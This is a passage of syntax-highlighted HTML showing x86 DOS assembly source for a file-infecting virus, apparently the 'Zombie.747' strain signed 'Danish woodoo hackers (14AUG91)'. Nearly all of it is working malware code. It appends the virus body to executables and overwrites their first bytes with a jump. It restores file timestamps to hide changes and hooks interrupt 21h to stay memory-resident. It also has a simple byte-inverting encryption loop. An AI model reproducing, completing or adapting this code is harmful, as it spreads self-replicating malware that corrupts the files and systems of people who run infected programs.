         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">calc_offset</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">         </span><span class="sc1">; Zero DX</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">         </span><span class="sc1">; Set current file position (EOF)</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_file_pos</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">close_file</span><span class="sc0">      </span><span class="sc1">; Error? Jump to close_file</span><span class="sc0">

         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">

         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">         </span><span class="sc1">; AX = offset of virus</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_offset</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_begin</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">         </span><span class="sc1">; Get file's date and time</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">         </span><span class="sc1">; Save registers at stack</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">         </span><span class="sc1">; Write to file</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">virus_begin</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">         </span><span class="sc1">; Zero DX</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">infect_exit</span><span class="sc0">     </span><span class="sc1">; Error? Jump to infect_exit</span><span class="sc0">

         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">         </span><span class="sc1">; Written all of the virus?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">infect_exit</span><span class="sc0">     </span><span class="sc1">; Not equal? Jump to infect_exit</span><span class="sc0">

         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">; Set current file position (SOF)</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">         </span><span class="sc1">; Zero DX</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_file_pos</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">infect_exit</span><span class="sc0">     </span><span class="sc1">; Error? Jump to infect_exit</span><span class="sc0">

         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">         </span><span class="sc1">; Write to file</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">         </span><span class="sc1">; Write three bytes</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">infect_code</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_begin</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">infect_exit</span><span class="sc0">     </span><span class="sc1">; Error? Jump to infect_exit</span><span class="sc0">

         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">infect_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">infect_count</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_begin</span><span class="sc4">]</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">         </span><span class="sc1">; Set file's date and time</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">         </span><span class="sc1">; Load registers from stack</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">close_file</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">         </span><span class="sc1">; Close file</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">infect_exit_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">get_psp_own</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">         </span><span class="sc1">; Get PSP segment of owner or spec...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">52h</span><span class="sc0">         </span><span class="sc1">; Get list of lists</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">-</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BX = segment of first memory con...</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">         </span><span class="sc1">; ES =    "    "    "     "      "</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">01h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BX = PSP segment of owner or spe...</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">allocate_mem</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">         </span><span class="sc1">; Allocate memory</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Save ES at stack</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">         </span><span class="sc1">; AX = segment of PSP for current ...</span><span class="sc0">
         </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; AX = segment of Memory Control B...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">         </span><span class="sc1">; ES =    "    "    "       "     "</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">03h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BX = size of memory block in par...</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Load ES from stack</span><span class="sc0">

         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">         </span><span class="sc1">; Subtract number of paragraphs to...</span><span class="sc0">
         </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">; BX = new size in paragraphs</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4ah</span><span class="sc0">         </span><span class="sc1">; Resize memory block</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">allocat_exit</span><span class="sc0">     </span><span class="sc1">; Error? Jump to allocat_exit</span><span class="sc0">

         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">         </span><span class="sc1">; Allocate memory</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">         </span><span class="sc1">; BX = number of paragraphs to all...</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">allocat_exit</span><span class="sc0">     </span><span class="sc1">; Error? Jump to allocat_exit</span><span class="sc0">

         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">
         </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; AX = segment of Memory Control B...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">         </span><span class="sc1">; ES =    "    "    "       "     "</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Save ES at stack</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_psp_own</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Load ES from stack</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">     </span><span class="sc1">; Store PSP segment of owner or sp...</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Load ES from stack</span><span class="sc0">

         </span><span class="sc6">clc</span><span class="sc0">             </span><span class="sc1">; Clear carry flag</span><span class="sc0">
</span><span class="sc5">allocat_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc5">virus_begin_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4b69h</span><span class="sc0">         </span><span class="sc1">; Zombie.747 function</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">         </span><span class="sc1">; Zero BX</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">4b69h</span><span class="sc0">         </span><span class="sc1">; Already resident?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">virus_exit</span><span class="sc0">      </span><span class="sc1">; Equal? Jump to virus_exit</span><span class="sc0">

         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">data_end</span><span class="sc4">-</span><span class="sc5">virus_begin</span><span class="sc4">+</span><span class="sc2">0fh</span><span class="sc4">)/</span><span class="sc2">10h</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">allocate_mem</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">virus_exit</span><span class="sc0">      </span><span class="sc1">; Error? Jump to virus_exit</span><span class="sc0">

         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">         </span><span class="sc1">; SI = delta offset</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">         </span><span class="sc1">; Zero DI</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">virus_begin</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc6">cld</span><span class="sc0">             </span><span class="sc1">; Clear direction flag</span><span class="sc0">
         </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">         </span><span class="sc1">; Move virus to top of memory</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_seg</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_begin</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Save ES at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3521h</span><span class="sc0">         </span><span class="sc1">; Get interrupt vector 21h</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">         </span><span class="sc1">; DX = segment of interrupt 21h</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Load ES from stack</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int21_addr</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_begin</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int21_addr</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_begin</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2521h</span><span class="sc0">         </span><span class="sc1">; Set interrupt vector 21h</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Save ES at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (ES)</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int21_virus</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_begin</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">virus_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">         </span><span class="sc1">; AX = segment of PSP for current ...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">         </span><span class="sc1">; DS =    "    "   "   "     "     "</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">         </span><span class="sc1">; ES =    "    "   "   "     "     "</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">origin_code</span><span class="sc0">     </span><span class="sc1">; SI = offset of origin_code</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_begin</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">         </span><span class="sc1">; Add delta offset to offset of co...</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">         </span><span class="sc1">; DI = offset of beginning of code</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">         </span><span class="sc1">; Move three bytes</span><span class="sc0">
         </span><span class="sc6">cld</span><span class="sc0">             </span><span class="sc1">; Clear direction flag</span><span class="sc0">
         </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">         </span><span class="sc1">; Move the original code to beginning</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">code_begin_</span><span class="sc0">     </span><span class="sc1">; BX = offset of code_begin_</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_begin</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">         </span><span class="sc1">; Add delta offset to offset of co...</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">

         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Zombie - Danish woodoo hackers (14AUG91)'</span><span class="sc0">
</span><span class="sc5">code_end</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">data_end</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">crypt_virus</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">             </span><span class="sc1">; Encrypt payload of the virus</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">crypt_begin</span><span class="sc0">     </span><span class="sc1">; SI = offset of crypt_begin</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">crypt_end</span><span class="sc4">-</span><span class="sc5">crypt_begin</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">crypt_loop</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Encrypt a byte</span><span class="sc0">

         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">          </span><span class="sc1">; Increase index register</span><span class="sc0">

         </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">crypt_loop</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0">         </span><span class="sc5">code_begin</span><span class="sc0">
</span></div></body>
</html>
